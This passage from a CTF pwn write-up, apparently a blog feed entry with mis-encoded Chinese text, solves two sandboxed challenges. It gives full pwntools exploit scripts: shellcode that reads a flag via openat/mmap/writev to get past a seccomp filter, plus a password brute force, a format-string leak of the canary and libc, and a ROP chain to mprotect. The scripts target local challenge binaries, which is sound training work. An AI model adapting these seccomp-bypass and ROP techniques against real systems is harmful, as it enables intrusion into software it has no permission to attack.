class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015</span><br><span class="line"> 0005: 0x15 0x09 0x00 0x00000000  if (A == read) goto 0015</span><br><span class="line"> 0006: 0x15 0x08 0x00 0x00000001  if (A == write) goto 0015</span><br><span class="line"> 0007: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0015</span><br><span class="line"> 0008: 0x15 0x06 0x00 0x00000011  if (A == pread64) goto 0015</span><br><span class="line"> 0009: 0x15 0x05 0x00 0x00000013  if (A == readv) goto 0015</span><br><span class="line"> 0010: 0x15 0x04 0x00 0x00000028  if (A == sendfile) goto 0015</span><br><span class="line"> 0011: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0015</span><br><span class="line"> 0012: 0x15 0x02 0x00 0x00000127  if (A == preadv) goto 0015</span><br><span class="line"> 0013: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0015</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>å¯»å¸¸çš„orwæ— æ³•ä½¿ç”¨ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯openatï¼Œmmapï¼Œwritevæ¥è¯»å–flag</p><h2 id="å‡½æ•°åŸå‹"><a href="#å‡½æ•°åŸå‹" class="headerlink" title="å‡½æ•°åŸå‹"></a>å‡½æ•°åŸå‹</h2><h3 id="openat"><a href="#openat" class="headerlink" title="openat"></a>openat</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span>* filename, <span class="type">int</span> flags, <span class="type">umode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure><p>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°<code>dfd</code>æŒ‡çš„æ˜¯å½“<code>path</code>ä¸ºç›¸å¯¹è·¯å¾„æ—¶ï¼Œè¯¥è·¯å¾„åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„å¼€å§‹åœ°å€ï¼ˆå³æ‰“å¼€ç›®å½•è·å–çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œä½†å¯ä»¥æŒ‡å®šå…¶ä¸º<code>AT_FDCWD</code>(-100)ï¼ŒæŒ‡å®šè·¯å¾„ä¸ºå½“å‰è·¯å¾„ã€‚å¦å¤–3ä¸ªå‚æ•°ä¸<code>open</code>å‚æ•°ç›¸åŒã€‚<code>openat</code>çš„è¿”å›å€¼ä¸<code>open</code>ç›¸åŒï¼Œéƒ½æ˜¯å½“å‰æ­£æœªä½¿ç”¨çš„æœ€å°çš„æ–‡ä»¶æè¿°ç¬¦å€¼ã€‚</p><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sys_mmap</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> prot, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">off_t</span> pgoff)</span>;</span><br></pre></td></tr></table></figure><p>å¯¹äºLinuxç³»ç»Ÿè°ƒç”¨ï¼Œ6ä¸ªå‚æ•°çš„ä¼ é€’å¯„å­˜å™¨åˆ†åˆ«ä¸º<code>rdi</code>ã€<code>rsi</code>ã€<code>rdx</code>ã€<code>r10</code>ã€<code>r8</code>ã€<code>r9</code>ã€‚ä¸Glibcçš„ä¼ å‚æœ‰æ‰€ä¸åŒã€‚</p><p>å†…æ ¸çš„<code>mmap</code>å‡½æ•°çš„<code>flag</code>å‚æ•°å’Œglibcçš„ä¸å¤ªä¸€æ ·ï¼Œ0x10è¡¨ç¤ºæ˜ å°„æ–‡ä»¶<code>MAP_FILE</code>ï¼Œ0x2è¡¨ç¤ºç§æœ‰æ˜ å°„<code>MAP_PRIVATE</code>ï¼Œ0x20è¡¨ç¤ºåŒ¿åæ˜ å°„<code>MAP_ANONYMOUS</code>ã€‚è¿™é‡Œéœ€è¦ä½¿ç”¨<code>MAP_FILE | MAP_PRIVATE</code>æ‰èƒ½å®Œæˆæ˜ å°„</p><h3 id="writev"><a href="#writev" class="headerlink" title="writev"></a>writev</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br></pre></td></tr></table></figure><p><code>fd</code>: æ–‡ä»¶æè¿°ç¬¦ï¼Œè¡¨ç¤ºè¦å†™å…¥çš„æ–‡ä»¶ã€ç®¡é“æˆ–ç½‘ç»œå¥—æ¥å­—ã€‚</p><p><code>iov</code>: æŒ‡å‘ <code>iovec</code> ç»“æ„æ•°ç»„çš„æŒ‡é’ˆï¼Œæ¯ä¸ª <code>iovec</code> ç»“æ„åŒ…å«ä¸€ä¸ªç¼“å†²åŒºå’Œå…¶é•¿åº¦ã€‚</p><p><code>iovcnt</code>: <code>iovec</code> ç»“æ„çš„æ•°é‡ã€‚</p><p><strong>iovecç»“æ„ä½“</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>  *iov_base; <span class="comment">// æŒ‡å‘æ•°æ®ç¼“å†²åŒºçš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="type">size_t</span> iov_len;  <span class="comment">// ç¼“å†²åŒºçš„é•¿åº¦</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>æ€è·¯æ˜¯ç»•è¿‡strlenç›´æ¥å†™shellcode</p><p>ç›´æ¥åœ¨æ ˆä¸Šå†™writevç¬¬äºŒä¸ªå‚æ•°(ç»“æ„ä½“æŒ‡é’ˆ)çš„*iov_baseå’Œiov_lenï¼Œä¸»è¦æ˜¯ç›´æ¥é€šè¿‡æ±‡ç¼–æ“ä½œå°±åƒä¸‹é¢çš„ç¤ºä¾‹ï¼Œä¼šæŠ¥é”™(ä¸æ¸…æ¥šåŸå› )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 0x100   </span><br><span class="line">lea rbx, [rsp+8] </span><br><span class="line">push rbx </span><br><span class="line">mov rsi, rsp</span><br></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line">mov_esi_0=<span class="string">b&#x27;\xbe\x00\x00\x00\x00&#x27;</span> </span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsp,0x1338000</span></span><br><span class="line"><span class="string"> mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"> mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    push 0x12</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push 0x3</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    xor r9, r9</span></span><br><span class="line"><span class="string">    push SYS_mmap</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x1    /* iov size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, 0x1337070</span></span><br><span class="line"><span class="string">    push SYS_writev</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload= mov_esi_0+asm(shell)</span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>,<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"><span class="comment">#æ ˆä¸Šå†™å‚æ•°</span></span><br><span class="line">payload+= p64(<span class="number">0x10000</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="SavethePrincess"><a href="#SavethePrincess" class="headerlink" title="SavethePrincess"></a>SavethePrincess</h1><h2 id="éšæœºæ•°ç»•è¿‡"><a href="#éšæœºæ•°ç»•è¿‡" class="headerlink" title="éšæœºæ•°ç»•è¿‡"></a>éšæœºæ•°ç»•è¿‡</h2><p>éšæœºæ•°ç”ŸæˆèŒƒå›´ä¸ºa-z</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">   love[i] = rand() % <span class="number">26</span> + <span class="number">97</span>;</span><br></pre></td></tr></table></figure><p>bufæ•°ç»„å’Œå­—ç¬¦iå†…å­˜åŒºåŸŸç›¸é‚»ï¼Œå½“bufæ•°ç»„å¡«æ»¡ä¼šå°†å­—ç¬¦iæ‰“å°å‡ºæ¥ï¼Œé€šè¿‡æ³„éœ²çš„å­—ç¬¦içˆ†ç ´éšæœºæ•°</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/Snipaste_2024-07-11_20-23-03.png" alt="memory"></p><p>å•å­—èŠ‚çˆ†ç ´ï¼Œæœ€å¤šçˆ†ç ´26*8&#x3D;208æ¬¡ï¼Œä¸‹é¢æ˜¯æˆ‘å†™çš„çˆ†ç ´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;please input your password: \n&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(key))</span><br><span class="line">    p.recv(<span class="number">26</span>)</span><br><span class="line">    data = <span class="built_in">ord</span>(p.recv(<span class="number">1</span>))</span><br><span class="line">    log.success(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data == num + <span class="number">1</span>):</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> (data == <span class="number">112</span>):</span><br><span class="line">        key_list = <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line">        log.success(key_list)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key[num] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[num])+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><p>æ¥ä¸‹æ¥å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²stackå’Œlibcï¼Œè¿›challengeå‡½æ•°æ‰“æ ˆæº¢å‡ºã€‚</p><p>å…ˆçœ‹ä¸€çœ¼æ²™ç®±ï¼Œå‘ç°åˆæŠŠå¸¸è§çš„orwç¦ç”¨æ‰äº†ï¼Œæ— æ³•è°ƒç”¨readå†™bssæ®µï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æ‰“æ ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000013  if (A == readv) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000028  if (A == sendfile) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000127  if (A == preadv) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>å…ˆç”¨mprotectå‡½æ•°ç»™æ ˆæ®µå¼€æƒé™ï¼Œæ³¨æ„çš„æ˜¯mprotectçš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦å†…å­˜é¡µå¯¹é½(0x1000)ï¼Œç„¶åæ¥ä¸Šshellcodeï¼Œ<code>openatï¼Œmmapï¼Œwrite</code>æ‰“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line">key = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;please input your password: \n&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(key))</span><br><span class="line">    p.recv(<span class="number">26</span>)</span><br><span class="line">    data = <span class="built_in">ord</span>(p.recv(<span class="number">1</span>))</span><br><span class="line">    log.success(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data == num + <span class="number">1</span>):</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> (data == <span class="number">112</span>):</span><br><span class="line">        key_list = <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line">        log.success(key_list)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key[num] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[num])+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b *$rebase(0x166A)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;ower!!!\n&#x27;</span>, <span class="string">b&#x27;%10$p&#x27;</span>+<span class="string">b&#x27;%15$p&#x27;</span>+<span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line">stack_base = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(stack))[<span class="number">0</span>:<span class="number">11</span>] + <span class="string">&#x27;000&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;stack =&gt; &#x27;</span>+ <span class="built_in">hex</span>(stack))</span><br><span class="line">log.info(<span class="string">&#x27;libcbase =&gt; &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;canary =&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">log.info(<span class="string">&#x27;stack_base =&gt; &#x27;</span> + <span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b *$rebase(0x170B)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bss = pie + 0x4320</span></span><br><span class="line"><span class="comment">#start = 0x4000 + pie</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000002a3e5</span> + libcbase</span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000002be51</span> + libcbase</span><br><span class="line">pop_rdx_r12_ret = <span class="number">0x000000000011f2e7</span> + libcbase</span><br><span class="line">mprotect = libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>] + libcbase </span><br><span class="line"><span class="comment">#read = libc.symbols[&#x27;read&#x27;] + libcbase </span></span><br><span class="line">leave_ret = <span class="number">0x000000000004da83</span> + libcbase</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"> mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    push 0x12</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push 0x3</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    xor r9, r9</span></span><br><span class="line"><span class="string">    push SYS_mmap</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,0x10000</span></span><br><span class="line"><span class="string">    mov rdx,0x40</span></span><br><span class="line"><span class="string">    push SYS_write</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(stack) + p64(pop_rdi_ret) + p64(stack_base)</span><br><span class="line">payload+= p64(pop_rsi_ret) + p64(<span class="number">0x20000</span>) + p64(pop_rdx_r12_ret) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(mprotect) + p64(stack + <span class="number">0x30</span>) +  asm(shellcode)</span><br><span class="line">sla(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;dragon!!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-reverse</title>
      <link href="/posts/ebbf1f2b/"/>
      <url>/posts/ebbf1f2b/</url>
      
